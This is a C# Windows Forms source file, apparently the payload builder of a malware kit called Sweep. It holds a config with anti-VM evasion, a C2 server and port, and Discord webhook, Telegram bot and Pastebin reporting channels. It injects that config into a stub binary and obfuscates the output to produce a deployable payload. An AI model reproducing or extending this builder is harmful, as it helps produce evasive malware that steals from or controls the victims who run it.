using Guna.UI2.WinForms;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Sweep.Forms
{
    public partial class Builder : Form
    {
        Remembrance remembrance = new Remembrance();
        JObject config = new JObject {
            ["debug"] = false,
            ["binfile"] = false,
            ["antivm"] = true,

            ["server"] = "127.0.0.1",
            ["port"] = 6969,

            ["pastebin"] = false,
            ["pastebinlink"] = "",

            ["discord"] = false,
            ["webhook"] = "",

            ["telegram"] = false,
            ["tgid"] = -0,
            ["tgtoken"] = ""
        };
        public Builder()
        {
            InitializeComponent();
            closable.Visible = !remembrance.GetAttribute<bool>("close1");
            closable2.Visible = !remembrance.GetAttribute<bool>("close2");
            update();
        }

        private void update()
        {
            foreach (TabPage tabPage in guna2TabControl1.TabPages)
            {
                foreach (Control ctrl in tabPage.Controls)
                {
                    if (ctrl.Tag == null || string.IsNullOrEmpty(ctrl.Tag.ToString()))
                        continue;

                    string tag = ctrl.Tag.ToString();

                    if (ctrl is Guna2ToggleSwitch btn)
                    {
                        if (remembrance.GetAttribute<bool>(tag))
                        {
                            btn.Checked = remembrance.GetAttribute<bool>(tag);
                        }
                        btn.CheckedChanged += (_,_) =>
                        {
                            remembrance.SetAttribute(tag, btn.Checked);
                        };
                        remembrance.SetAttribute(tag, btn.Checked);
                        config[tag] = btn.Checked;
                    }
                    else if (ctrl is Guna2TextBox txt)
                    {
                        var val = remembrance.GetAttribute<string>(tag);
                        if (!string.IsNullOrEmpty(val))
                        {
                            txt.Text = val;
                        }
                        remembrance.SetAttribute(tag, txt.Text);
                        config[tag] = txt.Text;
                    }
                }
            }
        }


        private void guna2Button2_Click(object sender, EventArgs e)
        {
            remembrance.SetAttribute("close1", true);
            closable.Visible = false;
            closable2.Left = closable.Left;
            closable2.Top = closable.Top;
        }

        private void guna2Button1_Click(object sender, EventArgs e)
        {
            remembrance.SetAttribute("close2", true);
            closable2.Visible = false;
        }

        private void guna2GradientButton1_Click(object sender, EventArgs e)
        {
            update();

            var dialog = builddialog.ShowDialog();
            if (dialog == DialogResult.OK)
            {
                var obfuscationLevelText = Obflevel.Text.Trim();

                // Build the path to the temporary stub
                string tempPath = Path.Combine(Path.GetTempPath(), Path.GetFileNameWithoutExtension(builddialog.FileName) + "_temp.bin");

                bool success = StubBuilder.ReplaceEmbeddedResourceFromString(
                    "./Extra/Stub.bin",
                    tempPath,
                    "config.json",
                    config.ToString()
                );

                if (!success)
                {
                    MessageBox.Show("FAILED! Unknown Error.");
                    return;
                }

                try
                {
                    // 🔧 Create and use the Obfuscator
                    var obfuscator = new Obfuscator(obfuscationLevelText);
                    obfuscator.Obfuscate(tempPath, builddialog.FileName);
                }
                catch (ArgumentException ex)
                {
                    MessageBox.Show(ex.Message, "Invalid Level", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Obfuscation failed: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                MessageBox.Show($"DONE! Saved at {builddialog.FileName}.");
            }
        }



    }
}
